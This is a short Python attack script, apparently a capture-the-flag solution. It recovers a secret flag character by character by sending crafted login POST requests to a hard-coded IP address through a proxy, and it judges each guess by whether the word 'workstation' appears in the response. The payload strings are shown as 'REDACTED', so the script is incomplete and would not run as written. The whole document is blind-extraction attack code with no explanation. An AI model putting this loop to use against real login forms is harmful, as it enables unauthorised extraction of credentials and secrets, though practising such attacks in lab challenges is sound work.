#!/bin/python3

import requests
import string
import sys

all_chars = string.ascii_lowercase
all_chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])
http_proxy = "172.26.96.1:8080"



flag = ""
print("")
print("The Flag for This Challenge is: ", end="")
while True:

    #set total number of char gone through to 0
    i = 0

    for char in all_chars:
        payload = {
                "username" : "REDACTED",
                "password" : "REDACTED" %(flag, char)
                }

        payload_str = "&".join("%s=%s" % (k,v) for k,v in payload.items())
        #print(payload_str)
        r = requests.post('http://159.65.58.189:30191/login', data=payload_str, headers={"Content-Type":"application/x-www-form-urlencoded"}, proxies={"http": http_proxy})
        i += 1

        if "workstation" not in r.text:
            flag += char
            sys.stdout.write(char)
            sys.stdout.flush()
            break

        elif i == len(all_chars):
            sys.exit(0)

        else:
            continue
